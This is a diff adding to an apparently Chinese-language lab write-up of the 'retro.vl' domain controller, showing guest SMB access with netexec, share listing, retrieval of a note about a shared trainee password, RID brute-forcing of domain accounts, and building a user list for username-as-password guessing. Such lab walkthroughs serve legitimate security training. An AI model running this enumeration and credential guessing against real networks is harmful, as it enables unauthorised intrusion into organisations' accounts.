@@ -66,3 +66,128 @@ Host script results:
 ```
 [★]$ echo "10.129.234.44 retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
 ```
+#### 使用Netexec
+```
+[★]$ nxc smb retro.vl "Guest" -p ""
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating default workspace
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing SMB protocol database
+[*] Initializing SSH protocol database
+[*] Initializing VNC protocol database
+[*] Initializing WMI protocol database
+[*] Initializing FTP protocol database
+[*] Initializing RDP protocol database
+[*] Copying default configuration file
+SMB         10.129.234.44   445    DC
+[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+```
+#### 2个 non-default shares（非默认共享） called Notes and Trainees
+```
+[★]$ nxc smb retro.vl -u "Guest" -p "" --shares
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
+SMB         10.129.234.44   445    DC               [*] Enumerated shares
+SMB         10.129.234.44   445    DC               Share           Permissions     Remark
+SMB         10.129.234.44   445    DC               -----           -----------     ------
+SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.44   445    DC               C$                              Default share
+SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share
+SMB         10.129.234.44   445    DC               Notes                       
+SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share
+SMB         10.129.234.44   445    DC               Trainees        READ
+```
+#### 使用smbclient连接到共享
+```\[★]$ smbclient //retro.vl/Trainees -U 'Guest'
+Password for [WORKGROUP\Guest]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jul 23 16:58:43 2023
+  ..                                DHS        0  Wed Jun 11 09:17:10 2025
+  Important.txt                       A      288  Sun Jul 23 17:00:13 2023
+
+		4659711 blocks of size 4096. 1326771 blocks available
+smb: \> get Important.txt
+getting file \Important.txt of size 288 as Important.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
+smb: \> exit
+```
+#### 本地查看
+```
+[★]$ cat Important.txt
+Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+
+Regards
+
+The Admins
+```
+#### 我知道你们中的一些人似乎很难记住强大而独特的密码。
+#### 所以我们决定把你们每个人都集中到一个账户里。
+#### 别再烦我们了。请。除了每天重置密码，我们还有其他事情要做。
+
+#### 如备注所述，学员账户的密码是所有学员共享的，可能是弱，以便用户可以记住它。使用来宾身份验证，应该枚举域中用户和组的rids
+```
+[★]$ nxc smb retro.vl -u "Guest" -p "" --rid-brute
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
+SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
+SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
+SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
+SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
+SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
+SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
+SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
+SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
+SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
+SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
+SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
+SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
+```
+#### 在默认对象中，需要注意5个非默认帐户。银行业似乎是一台机器由于在结尾处有一个$字符。
+#### 正如Important.txt中提到的，这些帐户可能使用了弱密码。这个最后，让我们检查这些帐户中是否有使用用户名作为密码的。
+```
+[★]$ nxc smb retro.vl -u "Guest" -p "" --rid-brute > rid.txt
+[★]$ grep -oP 'RETRO\\\K[^ ]+(?=\s+\(SidTypeUser\))' rid.txt > users.txt
+[★]$ cat users.txt
+Administrator
+Guest
+krbtgt
+DC$
+trainee
+BANKING$
+jburley
+tblack
+```
+#### \K：丢弃前面的内容   [^ ]+ 重新开始   \s+ 空格
+```
